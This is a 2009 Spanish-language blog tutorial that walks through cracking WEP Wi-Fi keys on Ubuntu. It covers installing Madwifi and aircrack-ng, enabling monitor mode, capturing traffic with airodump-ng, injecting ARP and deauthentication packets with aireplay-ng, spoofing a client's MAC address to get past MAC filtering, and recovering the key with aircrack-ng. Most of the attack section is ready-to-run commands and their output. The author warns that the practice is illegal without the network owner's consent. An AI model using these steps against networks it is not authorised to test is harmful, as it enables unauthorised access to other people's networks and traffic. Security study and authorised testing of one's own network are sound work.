<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>Crackear redes wifi con clave WEP desde Ubuntu linux &#8211; Racó Tècnic</title>
<meta name="description" content="Punt de trobada de coneixements">
<meta name="keywords" content="Wireless, aircrack, WEP">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="//elboletaire.github.io/racotecnic/images/">
<meta name="twitter:title" content="Crackear redes wifi con clave WEP desde Ubuntu linux">
<meta name="twitter:description" content="Punt de trobada de coneixements">
<meta name="twitter:creator" content="@racotecnic">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Crackear redes wifi con clave WEP desde Ubuntu linux">
<meta property="og:description" content="Punt de trobada de coneixements">
<meta property="og:url" content="//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/">
<meta property="og:site_name" content="Racó Tècnic">





<link rel="canonical" href="//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/">
<link href="//elboletaire.github.io/racotecnic/feed.xml" type="application/atom+xml" rel="alternate" title="Racó Tècnic Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="//elboletaire.github.io/racotecnic/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="//elboletaire.github.io/racotecnic/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="//elboletaire.github.io/racotecnic/assets/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="//elboletaire.github.io/racotecnic/assets/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="//elboletaire.github.io/racotecnic/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="//elboletaire.github.io/racotecnic/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="//elboletaire.github.io/racotecnic/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="//elboletaire.github.io/racotecnic/images/apple-touch-icon-144x144-precomposed.png">



</head>

<body id="post" >

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="//elboletaire.github.io/racotecnic/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="//elboletaire.github.io/racotecnic/images/" alt="Racó Tècnic photo" class="author-photo">
					<h4>Racó Tècnic</h4>
					<p>A subproject from <a href="http://underave.net">underave.net</a> created by <a href="https://github.com/elboletaire">elboletaire</a> and maintained by many collaborators.</p>
				</li>
				<li><a href="//elboletaire.github.io/racotecnic/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:elboletaire@underave.net"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				<li>
					<a href="https://twitter.com/racotecnic"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
				</li>
				<li>
					<a href="https://facebook.com/racotecnic"><i class="fa fa-fw fa-facebook"></i> Facebook</a>
				</li>
				
				
				<li>
					<a href="https://github.com/elboletaire/racotecnic"><i class="fa fa-fw fa-github"></i> GitHub</a>
				</li>
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="//elboletaire.github.io/racotecnic/posts/">All Posts</a></li>
				<li><a href="//elboletaire.github.io/racotecnic/tags/">All Tags</a></li>
				<li><a href="//elboletaire.github.io/racotecnic/categories/">All Categories</a></li>
			</ul>
		</li>
		
	    
	    <li><a href="https://github.com/elboletaire/racotecnic" target="_blank">Github</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->




<div id="main" role="main">
  <article class="hentry no-line-numbers">
    <header class="header-title">
      <div class="header-title-wrap">
        
          <h1 class="entry-title"><a href="//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/" rel="bookmark" title="Crackear redes wifi con clave WEP desde Ubuntu linux">Crackear redes wifi con clave WEP desde Ubuntu linux</a></h1>
        
        <h2><span class="entry-date date published"><time datetime="2009-03-19T19:40:51+01:00">March 19, 2009</time></span></h2>
        
        <p class="entry-reading-time">
          <i class="fa fa-clock-o"></i>
          
          Reading time ~18 minutes
        </p><!-- /.entry-reading-time -->
        
      </div><!-- /.header-title-wrap -->
    </header>
    <div class="entry-content">
      <ul>
  <li><a href="#intro">Introducción</a></li>
  <li><a href="#pasos">Primeros pasos (tarjetas compatibles) </a></li>
  <li><a href="#madwifi">Instalar driver Madwifi</a>
    <ul>
      <li><a href="#monitor">Activar modo monitor</a></li>
    </ul>
  </li>
  <li><a href="#installaircrack">Instalar aircrack-ng</a></li>
  <li><a href="#wep">Crackeando redes WEP</a>
    <ul>
      <li><a href="#monitor">Activar modo monitor</a></li>
      <li><a href="#airodump">Escanear redes y capturar paquetes</a></li>
      <li><a href="#macfilter">Comprobar bloqueo MAC</a></li>
      <li><a href="#injection">Inyección de paquetes (sin bloqueo MAC)</a></li>
      <li><a href="#macinjection">Inyección de paquetes (con bloqueo MAC)</a></li>
      <li><a href="#macchange">Cambiar dirección MAC de la interfaz de red</a></li>
      <li><a href="#authentication">Autenticación en el router</a></li>
      <li><a href="#aircrack">Averiguando la clave con aircrack-ng</a></li>
    </ul>
  </li>
  <li><a href="#descargas">Descarga de ficheros</a></li>
  <li><a href="#referencias">Páginas de referencia</a></li>
</ul>

<p><a name="intro"></a> Hace poco me volví a interesar por este tema y me costó tanto lograrlo (lo hice posible entre 4 o 5 páginas distintas) que he decidido hacer una entrada reuniendo todos los pasos.  Antes de continuar debéis tener presente que esto es ilegal en la mayor parte de los países así que si vais a hacer uso de ello** deberá ser sobre VUESTRA red WiFi**. Dicho esto, que seguramente pocos haréis caso alguno, procedamos a ello.</p>

<p><a id="more"></a><a id="more-286"></a></p>

<h2 id="primeros-pasos"><a name="pasos"></a>Primeros pasos</h2>

<p>El primer paso será averiguar si nuestra tarjeta WiFi permite que la activemos en modo monitor. El modo monitor nos permite hacer un tipo de ataque que reduce considerablemente el tiempo de obtención de las claves (de unos días a unos minutos). No obstante, con cualquier tarjeta podéis obtener claves, el problema es que con una tarjeta sin modo monitor tardaréis días o semanas (o quizás nunca la consigáis).</p>

<p>En <a title="Ver listado de tarjetas en elhacker.net" href="http://hwagm.elhacker.net/htm/tarjetas.htm" target="_blank">este enlace</a> hay un buen listado de tarjetas inalámbricas dónde se nos indica cuáles están preparadas para hacer inyección (modo monitor) y cuáles no.</p>

<p>Si vuestra tarjeta está en esta lista y en la celda de “Inyección” pone “Lx”, ¡premio! Vuestra tarjeta permite la inyección de tráfico.</p>

<p>Yo realizaré las pruebas con una D-link DWL con chipset Atheros (cuesta unos 25€ en cualquier tienda de informática).</p>

<p>Ahora que sabemos que nuestra tarjeta es compatible debemos instalar los drivers “Madwifi” para dicha tarjeta, ya que son los que nos permiten la inyección de tráfico y el uso de la aplicación aircrack-ng (la utilizada para averiguar las claves wifi).</p>

<p>Antes de poder instalar estos drivers necesitáis las herramientas de compilación y las cabeceras necesarias de linux (sin ello la instalación no se completaría). Así que accedemos a una terminal como administrador (tecleando “su” en ella) e instalamos las herramientas mencionadas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aptitude install build-essential linux-headers-<span class="k">$(</span>uname -r<span class="k">)</span>
</pre></td></tr></tbody></table>
</div>
</div>

<h2 id="instalar-driver-madwifi"><a name="madwifi"></a>Instalar driver Madwifi</h2>

<p>Una vez instaladas las cabeceras procedemos a la instalación de Madwifi. Para ello descarguemos la última versión de la web <a title="Ir a la página del proyecto Madwifi" href="http://www.madwifi-project.org" target="_blank">madwifi-project</a>, actualmente la última versión (y la que estoy utilizando yo) es la siguiente:  <a title="Descargar drivers madwifi" href="http://snapshots.madwifi-project.org/madwifi-hal-0.10.5.6/madwifi-hal-0.10.5.6-r3942-20090205.tar.gz">madwifi-hal-0.10.5.6-r3942-20090205.tar.gz</a> Descargad el fichero en la carpeta /tmp/ (por ejemplo) y acceded a ella mediante consola para descomprimir e instalar el fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4
5
6
7
8</pre></td><td class="code"><pre><span class="c">#ACCEDEMOS A LA CARPETA DONDE HEMOS DESCARGADO MADWIFI</span>
<span class="nb">cd</span> /tmp/
<span class="c">#DESCOMPRIMIMOS MADWIFI</span>
tar -xvvzf madwifi-hal-0.10.5.6-r3942-20090205.tar.gz
<span class="c">#ACCEDEMOS A LA CARPETA GENERADA</span>
<span class="nb">cd </span>madwifi-hal-0.10.5.6-r3942-20090205
<span class="c">#COMPILAMOS E INSTALAMOS</span>
make <span class="o">&amp;&amp;</span> make install
</pre></td></tr></tbody></table>
</div>
</div>

<p>Si estáis reinstalando el driver recordad eliminar el anterior antes de hacer <code class="highlighter-rouge">make &amp;&amp; make install</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>rmmod -w ath_pci.ko
</pre></td></tr></tbody></table>
</div>
</div>

<p>Ahora que ya lo tenemos instalado debemos añadir el módulo al kernel de linux:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>modprobe ath_pci
</pre></td></tr></tbody></table>
</div>
</div>

<p>Y para añadirlo siempre que arranque el sistema, lo añadimos en el fichero modules situado en la carpeta etc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre><span class="nb">echo </span>ath_pci &gt;&gt; /etc/modules
</pre></td></tr></tbody></table>
</div>
</div>

<p>Éste último comando escribe “ath_pci” al final del fichero modules. Si ya habíais instalado anteriormente Madwifi seguramente no sea necesario este paso (comprobad el contenido del fichero con “cat /etc/modules”).</p>

<h2 id="instalar-aircrack-ng"><a name="installaircrack"></a>Instalar aircrack-ng</h2>

<p>¡Ya tenemos instalado Madwifi! Lo siguiente que haremos será instalar aircrack-ng:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aptitude -y install aircrack-ng
</pre></td></tr></tbody></table>
</div>
</div>

<p>Menuda complicación, ¿eh? :D</p>

<h2 id="crackeando-redes-wep"><a name="wep"></a>Crackeando redes WEP</h2>

<p>Antes de continuar a delante quiero recordaros lo que ya he dicho al principio…  <strong>La mayoría de países no permiten hacer esto, así que si vais a hacerlo debe ser con consentimiento del dueño de la red que vayáis a atacar.</strong></p>

<h3 id="activar-modo-monitor"><a name="monitor"></a>Activar modo monitor</h3>

<p>Ahora que ya tenemos todo lo necesario activaremos el modo monitor de nuestra tarjeta para poder hacer inyección de paquetes.  Recordad que el último paso que hicimos fue añadir el módulo de la tarjeta al kernel de linux pero no hemos activado nuestra red. Comprobemos las redes que tenemos activas con “ifconfig”. Al hacerlo observaremos que tenemos una red “wifi0” pero esto es un dispositivo virtual y no nos sirve, así que pondremos en marcha el dispositivo ath0:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>wlanconfig ath0 create wlandev wifi0 wlanmode sta
</pre></td></tr></tbody></table>
</div>
</div>

<p>Si al hacerlo recibís el siguiente error:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>wlanconfig: ioctl: Invalid argument
</pre></td></tr></tbody></table>
</div>
</div>

<p>Es porque ya tenéis la red ath0 activada, pero para hacerla funcionar correctamente (solo para asegurarnos) haced lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4</pre></td><td class="code"><pre><span class="c">#LO DESTRUIMOS</span>
wlanconfig ath0 destroy
<span class="c">#Y LO VOLVEMOS A CREAR EN MODO STANDALONE (wlanmode sta)</span>
wlanconfig ath0 create wlandev wifi0 wlanmode sta
</pre></td></tr></tbody></table>
</div>
</div>

<p>Sé que parece algo estúpido, pero sin hacer esto probablemente no funcionaría correctamente (la primera vez, dado que hemos instalado los nuevos drivers sin destruir la conexión previamente).  Bien, ahora deberíais tener vuestra red wifi funcionando con normalidad y debéis poder conectaros a una red si disponéis de la contraseña.  Pasemos pues a activar el modo monitor de una vez:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4</pre></td><td class="code"><pre><span class="c">#LO DESTRUIMOS</span>
wlanconfig ath0 destroy
<span class="c">#Y LO VOLVEMOS A CREAR EN MODO STANDALONE (wlanmode sta)</span>
wlanconfig ath0 create wlandev wifi0 wlanmode monitor
</pre></td></tr></tbody></table>
</div>
</div>

<p>Ya la tenemos en modo monitor. Ahora aparentemente no funciona el wifi ya que si vamos a explorar redes con el applet de gnome no encuentra nada. Pero si no habéis recibido error alguno es porque está activado y podéis pasar al siguiente paso.</p>

<h3 id="escanear-redes-y-capturar-paquetes"><a name="airodump"></a>Escanear redes y capturar paquetes</h3>

<p>Primero haremos un escaneo sin especificar canal ni nada, simplemente para ver en qué canal se encuentra nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>airodump-ng ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>La pantalla está dividida en dos partes importantes: la de AP (access points), en la parte superior y la de clientes, en la parte inferior.</p>

<figure>
  <a rel="lightbox" href="//elboletaire.github.io/racotecnic/uploads/2009/03/airodump-ng.png" target="_blank"><img title="airodump-ng_thumb" src="//elboletaire.github.io/racotecnic/uploads/2009/03/airodump-ng_thumb.png" alt="airodump-ng_thumb" width="379" height="68" /></a>
  <figcaption>
    airodump-ng (clic para ampliar)
  </figcaption>
</figure>

<p>Las cosas que más nos interesan son BSSID (MAC del AP), PWR (potencia de la señal), #Data que nos dice el número de paquetes captados (paquetes que luego servirán para averiguar la contraseña, cuantos más paquetes más posibilidades de conseguirla), CH (canal), ENC (tipo de encriptación que para seguir este tutorial debe ser WEP), ESSID (nombre de la red), STATION (usuarios conectados al AP).  Mi red es la que tiene como nombre “JAZZTEL_2C” con BSSID 00:1A:23:14:23:3C y, evidentemente, esta es la que voy a atacar, así que empecemos capturando paquetes sólo para esta red (lo que reducirá el tamaño del fichero generado):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>airodump-ng --channel <span class="k">**</span>11<span class="k">**</span> --bssid <span class="k">**</span>00:1A:23:14:23:3C<span class="k">**</span> --write jazztel2c ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>En negrita están el canal y la BSSID respectivamente, que deberéis cambiar a partir de los datos obtenidos vosotros de vuestra red.  El parámetro –write indica dónde el nombre del fichero en el que se guardarán los datos y “ath0” es nuestra interfaz de red.</p>

<h3 id="comprobar-bloqueo-mac"><a name="macfilter"></a>Comprobar bloqueo MAC</h3>

<p>El siguiente paso será comprobar si el punto de acceso tiene activada la restricción MAC, para hacerlo utilizaremos aireplay-ng (en una nueva terminal, por supuesto):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aireplay-ng -1 0 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:11:22:33:44:55 ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>El primer parámetro es el tipo de ataque (un número del 0 al 6), en este caso un uno, seguido del número de veces que se va a hacer (0 es la primera posición, así que se repetirá una única vez). El parámetro -e es el nombre de la red, la -a su BSSID y la -h es una MAC inventada (ahí la gracia, saber si nos permite conectarnos con una mac que no exista en su lista negra) y el último parámetro es la interfaz de red que utilizaremos. Si el resultado es…</p>

<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4</pre></td><td class="code"><pre>16:35:29  Sending Authentication Request (Open System) [ACK]
16:35:29  Authentication successful
16:35:29  Sending Association Request [ACK]
16:35:29  Association successful :-) (AID: 1)
</pre></td></tr></tbody></table>
</div>
</div>

<p>El filtro MAC está inhabilitado y podéis pasar al paso “Inyección de paquetes (sin bloqueo mac)”, sino saltad a “Inyección de paquetes (con bloqueo mac)”.</p>

<h3 id="inyección-de-paquetes-sin-bloqueo-mac"><a name="injection"></a>Inyección de paquetes (sin bloqueo mac)</h3>

<p>Vayamos al terminal donde tenemos airodump-ng funcionando (captando paquetes) y comprobemos si hay algún STATION asociado al BSSID de la red a atacar. Si es así copiad la MAC de la estación y utilizadla en la siguiente orden:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aireplay-ng -3 -b 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>-3 es el tipo de ataque, -b la bssid a atacar, -h la MAC de la STATION y el último parámetro es la interfaz de red. En caso de no disponer de un STATION debéis poner vuestra MAC, para averiguarla podéis mirarlo en vuestra tarjeta de red o bien con el comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>ifconfig ath0 | grep HWaddr
</pre></td></tr></tbody></table>
</div>
</div>

<p>Si os da vuestra dirección separada por guiones recordad ponerla separada por puntos y sólo las 6 primeras parejas de números.  Hecho esto veréis como aireplay-ng empieza a enviar paquetes al AP. Puede que pasen unos minutos hasta que los “ARP” empiezan a incrementar, pero llegado ese momento podréis ver como los “#Data” de airodump-ng empiezan a subir rápidamente.</p>

<figure>
  <a rel="lightbox" href="//elboletaire.github.io/racotecnic/uploads/2009/03/aireplay-ng.png"><img class="size-full wp-image-327" title="aireplay-ng" src="//elboletaire.github.io/racotecnic/uploads/2009/03/aireplay-ng.png" alt="aireplay-ng" width="461" height="60" /></a>
  <figcaption>
    Inyección de tráfico con aireplay-ng
  </figcaption>
</figure>

<p>Si estamos atacando utilizando la mac de un STATION en lugar de la nuestra, nos aparecerá este error:</p>

<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3</pre></td><td class="code"><pre>The interface MAC (06:19:5B:C9:F2:4A) doesn't match the specified MAC (-h).

  ifconfig ath0 hw ether 00:16:CB:BA:23:D2
</pre></td></tr></tbody></table>
</div>
</div>

<p>Esto es porque la mac que le hemos indicado no coincide con la de nuestra tarjeta de red. Para solucionar esto basta con cambiar la mac por la de la estación que estemos emulando (utilizad control+C para terminar el proceso de aireplay-ng, cambiad la MAC y volved a ejecutar aireplay-ng). Para cambiar la MAC pasad al punto <a href="#macchange">Cambiar dirección MAC de la interfaz de red</a></p>

<h3 id="inyección-de-paquetes-con-bloqueo-mac"><a name="macinjection"></a>Inyección de paquetes (con bloqueo MAC)</h3>

<p>La opción más sencilla a la hora de inyectar paquetes en un AP con bloqueo MAC es hacerse pasar por uno de sus clientes. Para poder hacer esto tenemos que cambiar la dirección MAC, no obstante aireplay-ng tiene la posibilidad de atacar AP con bloqueo MAC (con este proceso no es necesario cambiar la MAC):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2</pre></td><td class="code"><pre>aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:11:22:33:44:55
aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:11:22:33:44:55
</pre></td></tr></tbody></table>
</div>
</div>

<p>Es un proceso bastante más lento que sin bloqueo de MAC, pero funciona igualmente. De todos modos si hay alguna estación conectada al AP la mejor opción es que cambiéis vuestra MAC a la de dicha estación.</p>

<h3 id="cambiar-dirección-mac-de-la-interfaz-de-red"><a name="macchange"></a>Cambiar dirección MAC de la interfaz de red</h3>

<p>Para ello hay dos maneras de hacerlo, una de ellas nos la indicaba un error de unas líneas más arriba:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>ifconfig ath0 hw ether 00:16:CB:BA:23:D2
</pre></td></tr></tbody></table>
</div>
</div>

<p>La otra es utilizar macchanger:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4
5
6
7
8</pre></td><td class="code"><pre><span class="c">#INSTALAMOS MACCHANGER</span>
aptitude -y install macchanger
<span class="c">#DESACTIVAMOS LA INTERFAZ DE RED ath0</span>
ifconfig ath0 down
<span class="c">#CAMBIAMOS LA MAC</span>
macchanger -m 00:16:CB:BA:23:D2
<span class="c">#REACTIVAMOS LA INTERFAZ DE RED ath0</span>
ifconfig ath0 up
</pre></td></tr></tbody></table>
</div>
</div>

<p>Haciendo esto nos aseguramos que el AP crea que somos uno de sus clientes y facilitará la obtención de paquetes ARP.</p>

<figure>
  <a rel="lightbox" href="//elboletaire.github.io/racotecnic/uploads/2009/03/aireplay-ng_sending.png"><img class="size-full wp-image-332" title="aireplay-ng_sending" src="//elboletaire.github.io/racotecnic/uploads/2009/03/aireplay-ng_sending.png" alt="aireplay-ng enviando paquetes" width="561" height="60" /></a>
  <figcaption>
    aireplay-ng enviando paquetes
  </figcaption>
</figure>

<h3 id="autenticación-en-el-router"><a name="authentication"></a>Autenticación en el router</h3>

<p>En ocasiones puede que se nos presente el siguiente error al ejecutar la inyección de tráfico con aireplay-ng:</p>

<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>Notice: got a deauth/disassoc packet. Is the source MAC associated ?
</pre></td></tr></tbody></table>
</div>
</div>

<p>Esto es debido a que no nos hemos identificado en el router y se da casi siempre que no hay una estación conectada al AP. Podemos solucionarlo de dos formas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aireplay-ng -1 0 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>Que de ser ejecutado correctamente nos mostrará en pantalla:</p>

<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4</pre></td><td class="code"><pre>18:18:20  Sending Authentication Request
18:18:20  Authentication successful
18:18:20  Sending Association Request
18:18:20  Association successful :-)
</pre></td></tr></tbody></table>
</div>
</div>

<p>El otro método es el que sigue:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aireplay-ng -1 6000 -o 1 -q 10 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0
</pre></td></tr></tbody></table>
</div>
</div>

<p>Aquí estamos indicando que envíe paquetes cada 6 segundos (en milisegundos) y que sólo los envíe en grupos de uno (-o 1) ya que muchos AP se confunden al mandarles muchos paquetes juntos (que es como actúa por defecto).</p>

<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
2
3
4
5
6</pre></td><td class="code"><pre>18:19:20  Sending Authentication Request (Open System) [ACK]
18:19:20  Authentication successful
18:19:20  Sending Association Request [ACK]
18:19:20  Association successful :-) (AID: 1)
18:19:42  Sending keep-alive packet [ACK]
18:19:55  Sending keep-alive packet [ACK]
</pre></td></tr></tbody></table>
</div>
</div>

<p>Ambas son igualmente eficientes (quizás la primera sea un poco más rápida, pero habrá muchas ocasiones en que no podréis utilizarla). Os recomiendo la segunda, ya que no paramos de autenticarnos en el router y no le damos pie a errores.</p>

<h3 id="averiguando-la-clave-con-aircrack-ng"><a name="aircrack"></a>Averiguando la clave con aircrack-ng</h3>

<p>Cuando el número de #Data esté por encima de 30.000 podemos ir ejecutando aircrack-ng en una nueva terminal cargando el fichero que se va guardando (es decir, no paréis la captura de paquetes con airodump, por si no tuviérais suficientes datos):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>aircrack-ng jazztel2c-01.cap
</pre></td></tr></tbody></table>
</div>
</div>

<p>Y.. presto! Ya tenemos nuestra clave:</p>

<figure>
  <a title="aircrack-ng (ampliar)" rel="lightbox" href="//elboletaire.github.io/racotecnic/uploads/2009/03/aircrack-ng.png" target="_blank"><img class="size-full wp-image-338" title="aircrack-ng_thumb" src="//elboletaire.github.io/racotecnic/uploads/2009/03/aircrack-ng_thumb.png" alt="aircrack-ng_thumb" width="286" height="33" /></a>
  <figcaption>
    Contraseña desencriptada (clic para ampliar)
  </figcaption>
</figure>

<h2 id="descarga-de-ficheros"><a name="descargas"></a>Descarga de ficheros</h2>

<p>En caso de que no pudierais utilizar “aptitude” porque la máquina desde la cual queréis hacer los ataques no tiene conexión a internet podéis descargar todos los programas que he ido mencionando desde la página de paquetes de ubuntu:</p>

<blockquote>
  <ul>
    <li><a title="Descargar build-essential" href="http://packages.ubuntu.com/intrepid/build-essential" target="_blank">build-essential</a></li>
    <li><a title="Descargar linux-headers-*" href="http://packages.ubuntu.com/search?searchon=names&amp;keywords=linux-headers" target="_blank">linux-headers</a></li>
    <li><a title="Descargar aircrack-ng" href="http://packages.ubuntu.com/intrepid/aircrack-ng" target="_blank">aircrack-ng</a></li>
  </ul>
</blockquote>

<p>En el caso de los linux-headers debéis descargar la versión correspondiente a vuestra versión de kernel. Para averiguarla podéis hacerlo con “uname”:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>uname -r
</pre></td></tr></tbody></table>
</div>
</div>

<p>Recordad destruir la interfaz y reactivarla en modo standalone una vez tengáis la contraseña para poderos conectar normalmente al AP.</p>

<h2 id="páginas-de-referencia"><a name="referencias"></a>Páginas de referencia</h2>

<blockquote>
  <ul>
    <li><a title="Ver original" href="http://ubuntuforums.org/showthread.php?t=528276" target="_blank">HOWTO: Aircrack-NG</a></li>
    <li><a title="Ver original" href="http://forums.remote-exploit.org/showthread.php?t=330" target="_blank">Howto get Madwifi-ng drivers to work properly!</a></li>
    <li><a title="Ir a google" href="http://www.google.es" target="_blank">Ooh todopoderoso Google</a></li>
  </ul>
</blockquote>

<p>Espero haberme explicado con suficiente claridad. Me he pasado mucho tiempo intentando organizarlo de la mejor manera posible. Ahora sólo os queda practicar! Con unas cuántas pruebas le pillaréis el tranquillo ;)</p>

      <footer class="entry-meta">
        <span class="entry-tags">
            
            <a href="//elboletaire.github.io/racotecnic/etiqueta/Wireless" title="Pages tagged Wireless" class="tag">
                <span class="term">Wireless</span>
            </a>
            
            
            <a href="//elboletaire.github.io/racotecnic/etiqueta/aircrack" title="Pages tagged aircrack" class="tag">
                <span class="term">aircrack</span>
            </a>
            
            
